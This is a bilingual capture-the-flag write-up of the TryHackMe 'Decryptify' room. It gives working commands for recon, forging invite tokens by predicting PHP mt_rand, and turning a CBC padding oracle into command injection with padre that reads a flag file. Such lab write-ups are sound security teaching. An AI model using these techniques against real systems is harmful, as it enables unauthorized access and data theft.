# TryHackMe - Decryptify

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| OS | Ubuntu / Linux |
| Key services | SSH, Apache on `1337` |
| Main bugs | Public logs, client-side secret, predictable `mt_rand`, padding oracle, command injection |

## Attack Chain Overview

```text
Nmap -> web fuzzing on :1337 -> public app.log invite code
  -> JS obfuscated API key
  -> API docs reveal PHP mt_rand token generation
  -> recover constant from known invite
  -> generate token for hello@fake.thm
  -> dashboard access
  -> CBC padding oracle on encrypted date parameter
  -> encrypt chosen shell commands
  -> flag read
```

## Resumen en Espanol

Decryptify fue una cadena de logica criptografica debil. Un log publico filtraba un invite code en base64 y usuarios. El JavaScript del cliente contenia una API key ofuscada, recuperable desde la consola del navegador. Con acceso a la API se vio que los tokens se generaban con `mt_rand()` y una semilla determinista.

Usando el token conocido de `alpha@fake.thm`, se hizo fuerza bruta del `constant_value` y luego se genero un invite valido para `hello@fake.thm`. Tras autenticarse, el parametro cifrado `date` del dashboard mostro errores de padding. Con `padre` se descifro el valor original (`date +%Y`) y se cifraron comandos propios, convirtiendo el padding oracle en command injection.

## English Summary

Decryptify was a weak-crypto application logic chain. A public log leaked a base64 invite code and usernames. Client-side JavaScript contained an obfuscated API key, recoverable from the browser console. The API documentation then revealed invite tokens were generated with deterministic PHP `mt_rand()` seeding.

Using the known `alpha@fake.thm` invite token, the constant value was brute-forced and a valid token was generated for `hello@fake.thm`. After login, the encrypted `date` dashboard parameter exposed padding errors. `padre` decrypted the original command (`date +%Y`) and encrypted chosen commands, turning the padding oracle into command injection.

## Reconnaissance

Tools: [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [curl](../../tools/web/curl.md).

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p22,1337 $TARGET -oN service
feroxbuster -u http://$TARGET:1337 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  --dont-scan locale
```

## Public Logs and API Key

Full techniques: [Public log invite code disclosure](../../exploits/web-disclosure/public-log-invite-code-disclosure.md), [JavaScript obfuscated API key disclosure](../../exploits/web-disclosure/javascript-obfuscated-api-key.md).

```text
http://$TARGET:1337/logs/app.log
```

```bash
echo "MTM0ODMzNzEyMg==" | base64 -d
curl http://$TARGET:1337/js/api.js
```

In the browser console:

```javascript
console.log(c);
```

The recovered API key unlocked `api.php`, which documented token generation.

## Predictable Token Generation

Full technique: [PHP mt_rand token prediction](../../exploits/crypto/php-mt-rand-token-prediction.md).

Known pair:

```text
alpha@fake.thm -> MTM0ODMzNzEyMg==
```

Brute-force the constant:

```bash
php get_constant.php
```

Generate a token for `hello@fake.thm`:

```bash
php get_token.php
```

Login:

```bash
curl -X POST http://$TARGET:1337/index.php \
  -d "invite_username=hello@fake.thm&invite_code=TOKEN_GENERATED" \
  -c cookies.txt -L
```

## Padding Oracle Command Injection

Full technique: [Padding oracle to command injection](../../exploits/crypto/padding-oracle-command-injection.md). Tool: [padre](../../tools/web/padre.md).

Decrypt the original value:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  'P6HqVqxBsuk77Gu7l8M+RrsLU8qI48mSEoqaOYAW1+Y='
```

Confirm command execution:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'id'
```

Avoid spaces when needed:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'base64</home/ubuntu/flag.txt'
echo "OUTPUT_BASE64" | base64 -d
```

## Key Takeaways

- ES: Un log publico puede ser suficiente para romper toda la logica de invitaciones.
- EN: A public log can be enough to break the whole invite flow.
- ES: Ofuscar JavaScript no protege secretos del cliente.
- EN: JavaScript obfuscation does not protect client-side secrets.
- ES: `mt_rand()` con semilla predecible no sirve para tokens de seguridad.
- EN: Predictably seeded `mt_rand()` is not suitable for security tokens.
- ES: Un padding oracle es peor si el plaintext acaba en `shell_exec`.
- EN: A padding oracle gets much worse when plaintext reaches shell execution.

## Related Notes

- [nmap](../../tools/recon/nmap.md)
- [feroxbuster](../../tools/fuzz/feroxbuster.md)
- [curl](../../tools/web/curl.md)
- [padre](../../tools/web/padre.md)
- [Public log invite code disclosure](../../exploits/web-disclosure/public-log-invite-code-disclosure.md)
- [JavaScript obfuscated API key disclosure](../../exploits/web-disclosure/javascript-obfuscated-api-key.md)
- [PHP mt_rand token prediction](../../exploits/crypto/php-mt-rand-token-prediction.md)
- [Padding oracle to command injection](../../exploits/crypto/padding-oracle-command-injection.md)
